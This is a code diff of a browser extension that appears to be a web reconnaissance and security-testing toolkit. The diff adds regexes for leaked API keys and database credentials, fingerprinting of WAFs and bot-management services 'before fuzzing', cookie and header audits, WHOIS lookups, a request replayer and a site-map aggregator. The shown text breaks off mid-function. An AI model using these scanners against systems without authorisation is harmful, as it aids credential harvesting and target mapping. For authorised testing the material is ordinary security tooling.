@@ -14,20 +14,40 @@ const browseHistory = {}; // domain → [{url, title, timestamp}]
 const SECRET_PATTERNS = [
   { name: 'AWS Access Key', regex: /AKIA[0-9A-Z]{16}/g, severity: 'high' },
   { name: 'AWS Secret Key', regex: /(?:aws_secret|secret_key|SecretAccessKey)['":\s]*([A-Za-z0-9/+=]{40})/gi, severity: 'high' },
+  { name: 'AWS Session Token', regex: /(?:aws_session_token|SessionToken)['":\s]*([A-Za-z0-9/+=]{100,})/gi, severity: 'high' },
   { name: 'Google API Key', regex: /AIza[0-9A-Za-z_-]{35}/g, severity: 'high' },
+  { name: 'GCP Service Account', regex: /"type":\s*"service_account"/g, severity: 'high' },
   { name: 'GitHub Token', regex: /gh[ps]_[A-Za-z0-9_]{36,255}/g, severity: 'high' },
+  { name: 'GitHub Fine-grained PAT', regex: /github_pat_[A-Za-z0-9_]{82}/g, severity: 'high' },
+  { name: 'GitLab Token', regex: /glpat-[A-Za-z0-9_-]{20,}/g, severity: 'high' },
+  { name: 'npm Token', regex: /npm_[A-Za-z0-9]{36}/g, severity: 'high' },
   { name: 'Slack Token', regex: /xox[baprs]-[0-9]{10,13}-[0-9A-Za-z-]+/g, severity: 'high' },
+  { name: 'Slack Webhook', regex: /https:\/\/hooks\.slack\.com\/services\/T[A-Z0-9]+\/B[A-Z0-9]+\/[A-Za-z0-9]+/g, severity: 'medium' },
+  { name: 'Discord Webhook', regex: /https:\/\/(?:discord(?:app)?\.com|canary\.discord\.com)\/api\/webhooks\/[0-9]+\/[A-Za-z0-9_-]+/g, severity: 'medium' },
   { name: 'Stripe Secret', regex: /sk_live_[0-9a-zA-Z]{24,99}/g, severity: 'high' },
   { name: 'Stripe Publishable', regex: /pk_live_[0-9a-zA-Z]{24,99}/g, severity: 'medium' },
+  { name: 'Stripe Test Key', regex: /[sp]k_test_[0-9a-zA-Z]{24,99}/g, severity: 'low' },
   { name: 'Twilio API Key', regex: /SK[0-9a-fA-F]{32}/g, severity: 'high' },
+  { name: 'Twilio Account SID', regex: /AC[a-fA-F0-9]{32}/g, severity: 'medium' },
   { name: 'SendGrid', regex: /SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}/g, severity: 'high' },
-  { name: 'Private Key', regex: /-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----/g, severity: 'high' },
-  { name: 'Bearer Token', regex: /[Bb]earer\s+[A-Za-z0-9\-._~+/]+=*/g, severity: 'medium' },
-  { name: 'JWT Token', regex: /eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/g, severity: 'medium' },
-  { name: 'Generic Secret', regex: /(?:secret|password|passwd|token|api_key|apikey|api-key|auth)[\s]*[=:]["'][^\s"']{8,}/gi, severity: 'medium' },
-  { name: 'IP Address', regex: /(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)/g, severity: 'low' },
-  { name: 'Firebase', regex: /AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}/g, severity: 'high' },
   { name: 'Mailgun', regex: /key-[0-9a-zA-Z]{32}/g, severity: 'high' },
+  { name: 'Mailchimp', regex: /[0-9a-f]{32}-us[0-9]{1,2}/g, severity: 'high' },
+  { name: 'Square Access Token', regex: /sq0(?:atp|csp)-[A-Za-z0-9_-]{22,43}/g, severity: 'high' },
+  { name: 'OpenAI API Key', regex: /sk-(?:proj-)?[A-Za-z0-9_-]{20,}T3BlbkFJ[A-Za-z0-9_-]{20,}/g, severity: 'high' },
+  { name: 'Anthropic API Key', regex: /sk-ant-(?:api03-)?[A-Za-z0-9_-]{40,}/g, severity: 'high' },
+  { name: 'Heroku', regex: /heroku[a-z0-9]*['"]?\s*[:=]\s*['"][0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}/gi, severity: 'high' },
+  { name: 'Sentry DSN', regex: /https:\/\/[0-9a-f]{32,}@(?:o[0-9]+\.)?(?:ingest\.)?sentry\.io\/[0-9]+/g, severity: 'medium' },
+  { name: 'Datadog API Key', regex: /(?:dd[_-]?api[_-]?key|datadog[_-]?api[_-]?key)['":\s=]*([0-9a-f]{32})/gi, severity: 'high' },
+  { name: 'Postgres Connection', regex: /postgres(?:ql)?:\/\/[^:\s'"]+:[^@\s'"]+@[^/\s'"]+/g, severity: 'high' },
+  { name: 'MySQL Connection', regex: /mysql:\/\/[^:\s'"]+:[^@\s'"]+@[^/\s'"]+/g, severity: 'high' },
+  { name: 'MongoDB Connection', regex: /mongodb(?:\+srv)?:\/\/[^:\s'"]+:[^@\s'"]+@[^/\s'"]+/g, severity: 'high' },
+  { name: 'Redis Connection', regex: /redis(?:s)?:\/\/(?:[^:\s'"]*:)?[^@\s'"]+@[^/\s'"]+/g, severity: 'high' },
+  { name: 'Firebase', regex: /AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}/g, severity: 'high' },
+  { name: 'Private Key', regex: /-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----/g, severity: 'high' },
+  { name: 'Bearer Token', regex: /[Bb]earer\s+[A-Za-z0-9\-._~+/]+=*/g, severity: 'medium' },
+  { name: 'JWT Token', regex: /eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*/g, severity: 'medium' },
+  { name: 'Generic Secret', regex: /["']?(?:secret|password|passwd|token|api_key|apikey|api-key|auth)["']?[\s]*[=:][\s]*["'][^\s"']{8,}/gi, severity: 'medium' },
+  { name: 'IP Address', regex: /(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)/g, severity: 'low' },
   { name: 'Basic Auth', regex: /[Bb]asic\s+[A-Za-z0-9+/]{20,}={0,2}/g, severity: 'medium' },
 ];
 // ═══ ENTROPY SCORING ═══
@@ -555,12 +575,14 @@ async function runTool(tool) {
       case 'subdomains': await toolSubdomains(); break;
       case 'reqresp': await toolReqResp(); break;
       case 'dns': await toolDns(); break;
+      case 'whois': await toolWhois(); break;
       case 'wpplugins': await toolWpPlugins(); break;
       case 'secrets': await toolSecrets(); break;
       case 'endpoints': await toolEndpoints(); break;
       case 'hidden': await toolHidden(); break;
       case 'links': await toolLinks(); break;
       case 'replayer': await toolReplayer(); break;
+      case 'sitemap': await toolSiteMap(); break;
       case 'cors': await toolCors(); break;
       case 'redirect': await toolRedirect(); break;
       case 'codec': toolCodec(); break;
@@ -599,6 +621,7 @@ async function toolTechStack() {
     if (n === 'server') all.push({ name: h.value, category: 'Server', confidence: 'high' });
     if (n === 'x-powered-by') all.push({ name: h.value, category: 'Backend', confidence: 'high' });
     if (n === 'x-aspnet-version') all.push({ name: 'ASP.NET ' + h.value, category: 'Backend', confidence: 'high' });
+    if (n === 'x-aspnetmvc-version') all.push({ name: 'ASP.NET MVC ' + h.value, category: 'Backend', confidence: 'high' });
     if (n === 'x-generator') all.push({ name: h.value, category: 'CMS', confidence: 'high' });
     if (n === 'x-drupal-cache' || n === 'x-drupal-dynamic-cache') all.push({ name: 'Drupal', category: 'CMS', confidence: 'high' });
     if (n === 'x-varnish') all.push({ name: 'Varnish', category: 'Cache', confidence: 'high' });
@@ -609,6 +632,18 @@ async function toolTechStack() {
     if (n === 'x-iinfo') all.push({ name: 'Imperva', category: 'WAF', confidence: 'high' });
     if (n === 'x-cdn' || (n === 'via' && /cloudflare|akamai|fastly|cdn/i.test(h.value))) all.push({ name: 'CDN: ' + h.value, category: 'CDN', confidence: 'medium' });
     if (n === 'x-frame-options') all.push({ name: 'X-Frame-Options: ' + h.value, category: 'Security Header', confidence: 'high' });
+    // Bot management vendors — useful to know before fuzzing
+    if (n === 'x-datadome' || (n === 'set-cookie' && /datadome=/i.test(h.value))) all.push({ name: 'DataDome', category: 'Bot Management', confidence: 'high' });
+    if (n === 'x-px-block' || /\b_px[23]?=/i.test(h.value)) all.push({ name: 'PerimeterX', category: 'Bot Management', confidence: 'high' });
+    if (n === 'set-cookie' && /incap_ses|visid_incap|nlbi_/i.test(h.value)) all.push({ name: 'Imperva Incapsula', category: 'WAF', confidence: 'high' });
+    if (n === 'set-cookie' && /__cf_bm=/i.test(h.value)) all.push({ name: 'Cloudflare Bot Mgmt', category: 'Bot Management', confidence: 'high' });
+    if (n === 'set-cookie' && /AWSALB|AWSALBCORS/i.test(h.value)) all.push({ name: 'AWS Application Load Balancer', category: 'Infrastructure', confidence: 'high' });
+    if (n === 'fly-request-id') all.push({ name: 'Fly.io', category: 'Hosting', confidence: 'high' });
+    if (n === 'x-vercel-id' || n === 'x-vercel-cache') all.push({ name: 'Vercel', category: 'Hosting', confidence: 'high' });
+    if (n === 'x-nf-request-id') all.push({ name: 'Netlify', category: 'Hosting', confidence: 'high' });
+    if (n === 'x-render-origin-server') all.push({ name: 'Render', category: 'Hosting', confidence: 'high' });
+    if (n === 'x-served-by' && /fastly/i.test(h.value)) all.push({ name: 'Fastly', category: 'CDN', confidence: 'high' });
+    if (n === 'x-bunny-cache-status') all.push({ name: 'BunnyCDN', category: 'CDN', confidence: 'high' });
   });
 
   // 2. Cookie-based tech detection
@@ -742,14 +777,19 @@ async function toolHeadersAudit() {
   const findings = [];
   let score = 0;
 
-  // CSP analysis
+  // CSP analysis — each weakness checked independently (no else-if chain)
   const csp = hd['content-security-policy'];
   if (csp) {
     score += 10;
-    if (csp.includes("'unsafe-inline'")) { findings.push({ sev: 'high', text: "CSP allows 'unsafe-inline' — XSS protection bypassed" }); score -= 5; }
-    else if (csp.includes("'unsafe-eval'")) { findings.push({ sev: 'high', text: "CSP allows 'unsafe-eval' — code injection possible" }); score -= 5; }
-    else if (csp.includes('*')) { findings.push({ sev: 'medium', text: "CSP contains wildcard (*) — overly permissive" }); score -= 3; }
-    else score += 5;
+    let cspClean = true;
+    if (/'unsafe-inline'/.test(csp)) { findings.push({ sev: 'high', text: "CSP allows 'unsafe-inline' — XSS protection bypassed" }); score -= 5; cspClean = false; }
+    if (/'unsafe-eval'/.test(csp)) { findings.push({ sev: 'high', text: "CSP allows 'unsafe-eval' — eval-based injection possible" }); score -= 5; cspClean = false; }
+    // Bare wildcard only — '*' as a source or scheme://* — but not subdomain wildcards like *.example.com
+    if (/(?:^|[\s;])(?:default-src|script-src|object-src|style-src|frame-src|connect-src)[^;]*\s\*(?:\s|;|$)/.test(csp) || /https?:\/\/\*(?:\s|;|$)/.test(csp)) {
+      findings.push({ sev: 'medium', text: 'CSP contains a bare wildcard (*) — overly permissive' });
+      score -= 3; cspClean = false;
+    }
+    if (cspClean) score += 5;
     if (/cdn\.jsdelivr|cdnjs\.cloudflare|unpkg\.com/.test(csp)) findings.push({ sev: 'medium', text: 'CSP trusts CDNs (jsdelivr/cdnjs/unpkg) — known bypass vectors' });
   } else { findings.push({ sev: 'high', text: 'No Content-Security-Policy — no XSS protection' }); }
 
@@ -801,9 +841,10 @@ async function toolHeadersAudit() {
   const leaked = [];
   ['server','x-powered-by','x-aspnet-version','x-runtime','x-generator','x-debug-token'].forEach(k => { if (hd[k]) leaked.push(k + ': ' + hd[k]); });
 
-  const grade = score >= 70 ? 'A' : score >= 50 ? 'B' : score >= 30 ? 'C' : score >= 15 ? 'D' : 'F';
+  const score100 = Math.max(0, Math.min(100, score));
+  const grade = score100 >= 70 ? 'A' : score100 >= 50 ? 'B' : score100 >= 30 ? 'C' : score100 >= 15 ? 'D' : 'F';
   b.innerHTML = `<div class="text-xs text-muted mb-4">URL: ${esc(activeTabUrl)}</div>
-    <div style="display:flex;align-items:center;margin-bottom:8px"><span class="header-grade grade-${grade.toLowerCase()}">${grade}</span><span class="text-sm">Score: ${score}/100</span></div>
+    <div style="display:flex;align-items:center;margin-bottom:8px"><span class="header-grade grade-${grade.toLowerCase()}">${grade}</span><span class="text-sm">Score: ${score100}/100</span></div>
     ${wafSigs.length ? `<div class="result-item info"><div class="result-label">🛡 WAF Detected</div><div class="result-value">${wafSigs.join(', ')} — payloads may need bypass techniques</div></div>` : ''}
     ${findings.map(f => `<div class="result-item ${f.sev}"><div class="result-label"><span class="result-tag tag-${f.sev}">${f.sev}</span></div><div class="result-value">${esc(f.text)}</div></div>`).join('')}
     ${leaked.length ? `<div class="result-item medium mt-4"><div class="result-label">🔓 Info Disclosure</div><div class="result-value">${leaked.map(esc).join('<br>')}</div></div>` : ''}`;
@@ -827,7 +868,18 @@ async function toolCookies() {
     if (/^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$/.test(c.value)) jwtCookies.push(c.name);
     if (!c.httpOnly && !TRACKING_COOKIES.test(c.name)) securityIssues.push(`${c.name}: missing HttpOnly`);
     if (!c.secure) securityIssues.push(`${c.name}: missing Secure`);
+    // SameSite=None without Secure: Chrome rejects these outright, Firefox warns. The cookie likely
+    // isn't actually being set cross-origin, which often masks broken auth flows.
+    if (c.sameSite === 'no_restriction' && !c.secure) securityIssues.push(`${c.name}: SameSite=None without Secure (browsers reject — broken cookie)`);
     if ((c.sameSite === 'unspecified' || c.sameSite === 'none') && !TRACKING_COOKIES.test(c.name)) securityIssues.push(`${c.name}: SameSite=${c.sameSite || 'unspecified'}`);
+    // __Host- prefix MUST: Secure, no Domain attribute, Path=/
+    if (c.name.startsWith('__Host-')) {
+      if (!c.secure) securityIssues.push(`${c.name}: __Host- prefix requires Secure`);
+      if (c.domain && c.domain.startsWith('.')) securityIssues.push(`${c.name}: __Host- prefix forbids Domain attribute`);
+      if (c.path !== '/') securityIssues.push(`${c.name}: __Host- prefix requires Path=/`);
+    }
+    // __Secure- prefix MUST: Secure
+    if (c.name.startsWith('__Secure-') && !c.secure) securityIssues.push(`${c.name}: __Secure- prefix requires Secure`);
     if (c.expirationDate) {
       const daysUntilExpiry = Math.floor((c.expirationDate * 1000 - Date.now()) / 86400000);
       if (daysUntilExpiry > 365) securityIssues.push(`${c.name}: expires in ${daysUntilExpiry} days (excessive)`);
@@ -1117,14 +1169,71 @@ async function toolDns() {
   // Email security
   if (res.emailSecurity) {
     const es = res.emailSecurity;
-    html += `<div class="result-label mt-6 mb-4">📧 Email Security (SPF/DMARC)</div>`;
+    html += `<div class="result-label mt-6 mb-4">📧 Email Security (SPF / DMARC / DKIM / MTA-STS)</div>`;
     if (es.spf) html += `<div class="result-item info"><div class="result-label">SPF</div><div class="result-value" style="font-size:9px;word-break:break-all">${esc(es.spf)}</div></div>`;
     if (es.dmarc) html += `<div class="result-item info"><div class="result-label">DMARC</div><div class="result-value" style="font-size:9px;word-break:break-all">${esc(es.dmarc)}</div></div>`;
+    if (es.dkim && es.dkim.length) {
+      html += `<div class="result-item info"><div class="result-label">DKIM (${es.dkim.length} selector${es.dkim.length===1?'':'s'} found)</div><div class="result-value" style="font-size:9px">` +
+        es.dkim.map(d => `<strong>${esc(d.selector)}</strong>: ${esc(d.value.slice(0,80))}…`).join('<br>') + `</div></div>`;
+    }
+    if (es.mtaSts) html += `<div class="result-item info"><div class="result-label">MTA-STS</div><div class="result-value" style="font-size:9px;word-break:break-all">${esc(es.mtaSts)}</div></div>`;
+    if (es.bimi) html += `<div class="result-item info"><div class="result-label">BIMI</div><div class="result-value" style="font-size:9px;word-break:break-all">${esc(es.bimi)}</div></div>`;
     es.findings.forEach(f => {
       html += `<div class="result-item ${f.severity}"><div class="result-label"><span class="result-tag tag-${f.severity}">${f.severity}</span></div><div class="result-value">${esc(f.text)}</div></div>`;
     });
   }
   b.innerHTML = html || '<div class="text-muted text-sm">No records</div>';
+  finalizeResults('recon');
+}
+
+async function toolWhois() {
+  const b = showResults('recon', 'WHOIS', true);
+  const root = getRootDomain(activeTabDomain) || activeTabDomain;
+  if (!root || /^\d+\.\d+\.\d+\.\d+$/.test(root)) {
+    b.innerHTML = '<div class="text-muted text-sm">No domain detected (looks like an IP). WHOIS works on registrable domains.</div>';
+    return;
+  }
+  b.innerHTML = '<div class="loading-text"><span class="spinner"></span> Querying RDAP for ' + esc(root) + '…</div>';
+  const res = await chrome.runtime.sendMessage({ type: 'WHOIS_LOOKUP', domain: root });
+  if (!res.ok) { b.innerHTML = errMsg(res.error || 'WHOIS lookup failed'); return; }
+  const d = res.data;
+  // RDAP response has events, entities, status, ldhName, etc.
+  const created = (d.events || []).find(e => e.eventAction === 'registration')?.eventDate;
+  const updated = (d.events || []).find(e => e.eventAction === 'last changed' || e.eventAction === 'last update of RDAP database')?.eventDate;
+  const expires = (d.events || []).find(e => e.eventAction === 'expiration')?.eventDate;
+  const status = d.status || [];
+  const registrar = (d.entities || []).find(e => (e.roles || []).includes('registrar'));
+  const registrarName = registrar?.vcardArray?.[1]?.find(v => v[0] === 'fn')?.[3] || 'unknown';
+  const nameservers = d.nameservers || [];
+
+  // Recency warning — domains registered <30 days ago can be phishing/malware infrastructure
+  let recencyNote = '';
+  if (created) {
+    const ageMs = Date.now() - new Date(created).getTime();
+    const ageDays = Math.floor(ageMs / 86400000);
+    if (ageDays < 30) recencyNote = `<div class="result-item high"><div class="result-label">⚠ Recently registered</div><div class="result-value">Domain registered ${ageDays} day${ageDays===1?'':'s'} ago — high suspicion for phishing/scam infrastructure</div></div>`;
+    else if (ageDays < 365) recencyNote = `<div class="result-item medium"><div class="result-label">Moderately new domain</div><div class="result-value">Registered ${Math.round(ageDays/30)} months ago</div></div>`;
+  }
+
+  let html = `<div class="text-xs text-muted mb-4">Domain: <code>${esc(root)}</code></div>`;
+  html += recencyNote;
+  html += `<div class="result-item info"><div class="result-label">Registrar</div><div class="result-value">${esc(registrarName)}</div></div>`;
+  if (created) html += `<div class="result-item info"><div class="result-label">Registered</div><div class="result-value">${esc(created)}</div></div>`;
+  if (updated) html += `<div class="result-item info"><div class="result-label">Last changed</div><div class="result-value">${esc(updated)}</div></div>`;
+  if (expires) {
+    const expSoon = new Date(expires).getTime() - Date.now() < 30 * 86400000;
+    html += `<div class="result-item ${expSoon ? 'medium' : 'info'}"><div class="result-label">Expires</div><div class="result-value">${esc(expires)}${expSoon ? ' — expiring soon' : ''}</div></div>`;
+  }
+  if (status.length) html += `<div class="result-item info"><div class="result-label">Status</div><div class="result-value" style="font-size:9.5px">${status.map(esc).join(', ')}</div></div>`;
+  if (nameservers.length) html += `<div class="result-item info"><div class="result-label">Nameservers (${nameservers.length})</div><div class="result-value" style="font-size:9.5px">${nameservers.map(n => esc(n.ldhName || n)).join('<br>')}</div></div>`;
+
+  // Privacy redaction detection
+  const fullText = JSON.stringify(d);
+  const redacted = /redacted|privacy|whoisguard|domains?\s*by\s*proxy|contact privacy|withheld/i.test(fullText);
+  if (redacted) html += `<div class="result-item low"><div class="result-label">🛡 WHOIS privacy enabled</div><div class="result-value">Registrant details are hidden behind a privacy service. Common, but worth noting.</div></div>`;
+
+  html += `<details class="mt-6"><summary class="text-xs text-muted" style="cursor:pointer">Raw RDAP response</summary><pre class="text-xs" style="background:var(--surface-hover);padding:6px;border-radius:3px;overflow:auto;max-height:300px;font-size:9px">${esc(JSON.stringify(d, null, 2))}</pre></details>`;
+  b.innerHTML = html;
   finalizeResults('recon');
 }
 
@@ -1469,19 +1578,79 @@ async function toolReplayer() {
   const res = await chrome.runtime.sendMessage({ type: 'GET_CAPTURED_REQUESTS', tabId: activeTabId });
   const reqs = res.requests||[];
   if(!reqs.length){ b.innerHTML='<div class="text-muted text-sm">No requests captured. Browse first.</div>'; return; }
-  const display = reqs.slice(-20).reverse();
-  b.innerHTML = `<div class="flex-between mb-6"><span class="text-sm">${reqs.length} captured</span><button class="btn-sm" id="rp-clear" style="font-size:9px">Clear All</button></div>`+display.map((r,i)=>{const u=new URL(r.url);const hasBody=r.body&&r.body.length>0;return`<div class="result-item ${hasBody?'medium':'info'}" style="cursor:pointer" data-ri="${i}"><div class="result-label"><span class="result-tag tag-${hasBody?'medium':'info'}">${r.method||'GET'}</span>${r.statusCode||'?'}</div><div class="result-value">${esc(u.pathname+u.search).slice(0,70)}</div>${hasBody?`<div class="text-xs text-muted">Body: ${esc(r.body.slice(0,60))}${r.body.length>60?'…':''}</div>`:''}</div>`}).join('')+
-  `<div class="mt-8" id="rp-det" style="display:none"><div class="tool-input-row"><select class="tool-select" id="rp-m" style="width:80px"><option>GET</option><option>POST</option><option>PUT</option><option>DELETE</option><option>PATCH</option><option>OPTIONS</option></select></div><input class="tool-input mb-6" id="rp-u"><textarea class="tool-input mb-6" id="rp-h" rows="2" placeholder="Headers JSON">{}</textarea><textarea class="tool-input mb-6" id="rp-b" rows="3" placeholder="Request body (form data or JSON)"></textarea><div class="tool-input-row"><button class="btn-sm primary" id="rp-send">Send</button><button class="btn-sm" id="rp-curl">Copy cURL</button></div><pre class="result-value mt-6" id="rp-out" style="max-height:200px;overflow:auto;white-space:pre-wrap"></pre></div>`;
-  b.querySelectorAll('[data-ri]').forEach(el=>el.addEventListener('click',()=>{
-    const r=display[+el.dataset.ri];
-    b.querySelector('#rp-det').style.display='block';
-    b.querySelector('#rp-m').value=r.method||'GET';
-    b.querySelector('#rp-u').value=r.url;
-    if(r.body) b.querySelector('#rp-b').value=r.body;
-    // Pre-fill headers if available
-    if(r.requestHeaders){try{const h={};r.requestHeaders.forEach(rh=>{if(!['host','connection','content-length','accept-encoding'].includes(rh.name.toLowerCase()))h[rh.name]=rh.value});b.querySelector('#rp-h').value=JSON.stringify(h,null,2)}catch{}}
-  }));
+  let display = reqs.slice(-50).reverse();
+
+  // Per-request flags for filtering
+  const enrich = (r) => {
+    const hasBody = !!(r.body && r.body.length > 0);
+    const hasAuth = !!(r.requestHeaders || []).find(h => /^(authorization|x-api-key|x-auth-token|cookie)$/i.test(h.name));
+    return { ...r, _hasBody: hasBody, _hasAuth: hasAuth };
+  };
+  display = display.map(enrich);
+
+  const renderList = (filtered) => {
+    return filtered.map((r,i)=>{
+      let path; try { const u=new URL(r.url); path = u.pathname+u.search; } catch { path = r.url; }
+      const status = r.statusCode || '?';
+      const sevTag = status >= 500 ? 'high' : status >= 400 ? 'medium' : status >= 300 ? 'low' : status >= 200 ? 'info' : 'info';
+      return `<div class="result-item ${sevTag}" style="cursor:pointer" data-ri="${i}"><div class="result-label"><span class="result-tag tag-${sevTag}">${r.method||'GET'}</span>${status}${r._hasAuth ? ' <span style="color:var(--accent)">🔐</span>' : ''}</div><div class="result-value">${esc(path).slice(0,80)}</div>${r._hasBody?`<div class="text-xs text-muted">Body: ${esc(r.body.slice(0,60))}${r.body.length>60?'…':''}</div>`:''}</div>`;
+    }).join('');
+  };
+
+  b.innerHTML = `<div class="flex-between mb-4"><span class="text-sm">${reqs.length} captured (showing last ${display.length})</span><button class="btn-sm" id="rp-clear" style="font-size:9px">Clear All</button></div>
+    <div class="codec-row mb-4" style="font-size:9px;flex-wrap:wrap;gap:4px">
+      <select class="tool-select" id="rp-fm" style="font-size:9px;padding:2px 4px;flex:0 0 auto"><option value="">All methods</option><option>GET</option><option>POST</option><option>PUT</option><option>DELETE</option><option>PATCH</option></select>
+      <select class="tool-select" id="rp-fs" style="font-size:9px;padding:2px 4px;flex:0 0 auto"><option value="">All status</option><option value="2">2xx</option><option value="3">3xx</option><option value="4">4xx</option><option value="5">5xx</option></select>
+      <label style="display:inline-flex;align-items:center;gap:3px;cursor:pointer"><input type="checkbox" id="rp-fb" style="margin:0;width:12px;height:12px">Has body</label>
+      <label style="display:inline-flex;align-items:center;gap:3px;cursor:pointer"><input type="checkbox" id="rp-fa" style="margin:0;width:12px;height:12px">Has auth</label>
+      <input class="tool-input" id="rp-fp" placeholder="path filter…" style="font-size:9px;padding:2px 6px;flex:1;min-width:80px">
+    </div>
+    <div id="rp-list">${renderList(display)}</div>
+    <div class="mt-8" id="rp-det" style="display:none"><div class="tool-input-row"><select class="tool-select" id="rp-m" style="width:80px"><option>GET</option><option>POST</option><option>PUT</option><option>DELETE</option><option>PATCH</option><option>OPTIONS</option></select></div><input class="tool-input mb-6" id="rp-u"><textarea class="tool-input mb-6" id="rp-h" rows="2" placeholder="Headers JSON">{}</textarea><textarea class="tool-input mb-6" id="rp-b" rows="3" placeholder="Request body (form data or JSON)"></textarea><div class="tool-input-row" style="flex-wrap:wrap;gap:4px"><button class="btn-sm primary" id="rp-send">Send</button><button class="btn-sm" id="rp-anon">Send Anon (no cookies)</button><button class="btn-sm" id="rp-curl">Copy cURL</button></div><pre class="result-value mt-6" id="rp-out" style="max-height:200px;overflow:auto;white-space:pre-wrap"></pre></div>`;
+
+  // Filter logic
+  const applyFilters = () => {
+    const fm = b.querySelector('#rp-fm').value;
+    const fs = b.querySelector('#rp-fs').value;
+    const fb = b.querySelector('#rp-fb').checked;
+    const fa = b.querySelector('#rp-fa').checked;
+    const fp = b.querySelector('#rp-fp').value.toLowerCase();
+    const filtered = display.filter(r => {
+      if (fm && (r.method||'GET') !== fm) return false;
+      if (fs && String(r.statusCode||'').charAt(0) !== fs) return false;
+      if (fb && !r._hasBody) return false;
+      if (fa && !r._hasAuth) return false;
+      if (fp && !r.url.toLowerCase().includes(fp)) return false;
+      return true;
+    });
+    b.querySelector('#rp-list').innerHTML = renderList(filtered);
+    wireListClicks(filtered);
+  };
+  ['rp-fm','rp-fs','rp-fb','rp-fa','rp-fp'].forEach(id => b.querySelector('#'+id)?.addEventListener('input', applyFilters));
+
+  const wireListClicks = (list) => {
+    b.querySelectorAll('[data-ri]').forEach(el=>el.addEventListener('click',()=>{
+      const r=list[+el.dataset.ri];
+      b.querySelector('#rp-det').style.display='block';
+      b.querySelector('#rp-m').value=r.method||'GET';
+      b.querySelector('#rp-u').value=r.url;
+      if(r.body) b.querySelector('#rp-b').value=r.body;
+      if(r.requestHeaders){try{const h={};r.requestHeaders.forEach(rh=>{if(!['host','connection','content-length','accept-encoding'].includes(rh.name.toLowerCase()))h[rh.name]=rh.value});b.querySelector('#rp-h').value=JSON.stringify(h,null,2)}catch{}}
+    }));
+  };
+  wireListClicks(display);
+
   b.querySelector('#rp-send')?.addEventListener('click',async()=>{let h={};try{h=JSON.parse(b.querySelector('#rp-h').value)}catch{};const r=await chrome.runtime.sendMessage({type:'REPLAY_REQUEST',url:b.querySelector('#rp-u').value,method:b.querySelector('#rp-m').value,headers:h,body:b.querySelector('#rp-b').value||undefined});b.querySelector('#rp-out').textContent=r.ok?`HTTP ${r.status}\n${JSON.stringify(r.headers,null,2)}\n\n${r.text}`:'Error: '+r.error});
+  b.querySelector('#rp-anon')?.addEventListener('click',async()=>{
+    let h={};try{h=JSON.parse(b.querySelector('#rp-h').value)}catch{};
+    // Strip cookie & authorization headers for anon replay
+    const cleanH = {};
+    for (const [k, v] of Object.entries(h)) {
+      if (!/^(cookie|authorization|x-api-key|x-auth-token|x-csrf-token|x-xsrf-token)$/i.test(k)) cleanH[k] = v;
+    }
+    const r = await chrome.runtime.sendMessage({type:'REPLAY_REQUEST', url:b.querySelector('#rp-u').value, method:b.querySelector('#rp-m').value, headers: cleanH, body:b.querySelector('#rp-b').value||undefined, omitCredentials: true});
+    b.querySelector('#rp-out').textContent = r.ok ? `[ANON] HTTP ${r.status}\n${JSON.stringify(r.headers,null,2)}\n\n${r.text}` : 'Error: '+r.error;
+  });
   b.querySelector('#rp-curl')?.addEventListener('click',()=>{
     const m=b.querySelector('#rp-m').value, u=b.querySelector('#rp-u').value, bd=b.querySelector('#rp-b').value;
     let cmd=`curl -X ${m} '${u}'`;
@@ -1495,12 +1664,154 @@ async function toolReplayer() {
     b.innerHTML = '<div class="text-muted text-sm">Cleared. Browse to capture new requests.</div>';
     log('Replayer cleared', 'success');
   });
-  finalizeResults('offensive');
+  finalizeResults('utility');
+}
+
+// ═══ SITE MAP — cross-tab, all-subdomain aggregate (Burp-style proxy history) ═══
+async function toolSiteMap() {
+  const b = showResults('utility', 'Site Map', false);
+  const root = getRootDomain(activeTabDomain);
+  if (!root) { b.innerHTML = errMsg('No active domain detected'); return; }
+
+  b.innerHTML = '<div class="loading-text"><span class="spinner"></span> Loading domain aggregate…</div>';
+  const res = await chrome.runtime.sendMessage({ type: 'GET_DOMAIN_AGGREGATE', domain: root });
+  if (!res.ok) {
+    b.innerHTML = `<div class="text-sm mb-6">Domain: <code>${esc(root)}</code></div><div class="text-muted text-sm">${esc(res.error)}</div><div class="text-xs text-muted mt-4">The site map captures everything across tabs and subdomains in real time. Browse the target normally — pages, navigation, XHR, JS chunks — and revisit this tool to see everything aggregated by host and path.</div>`;
+    return;
+  }
+
+  const hosts = res.hosts || {};
+  const jsFiles = res.jsFiles || {};
+  const endpoints = res.endpoints || {};
+  const hostList = Object.entries(hosts).sort((a,b) => b[1] - a[1]);
+  const jsList = Object.entries(jsFiles).sort((a,b) => (b[1].firstSeen||0) - (a[1].firstSeen||0));
+  const epList = Object.entries(endpoints).sort((a,b) => b[1].count - a[1].count);
+  const unscanned = jsList.filter(([_, v]) => !v.scanned).length;
+
+  // Group endpoints by host > path
+  const tree = {};
+  epList.forEach(([key, ep]) => {
+    try {
+      const u = new URL(ep.url);
+      const h = u.hostname;
+      const p = u.pathname || '/';
+      if (!tree[h]) tree[h] = {};
+      if (!tree[h][p]) tree[h][p] = [];
+      tree[h][p].push({ method: ep.method, count: ep.count, lastStatus: ep.lastStatus, url: ep.url });
+    } catch {}
+  });
+
+  const authBanner = res.authDetectedAt
+    ? `<div class="result-item info" style="margin-bottom:8px"><div class="result-label">🔐 Authenticated session detected</div><div class="result-value">Auth cookie <code>${esc(res.authCookie || 'session-like')}</code> first appeared ${new Date(res.authDetectedAt).toLocaleTimeString()}. JS / XHR captured after this time may be authenticated-only and worth re-scanning.</div></div>`
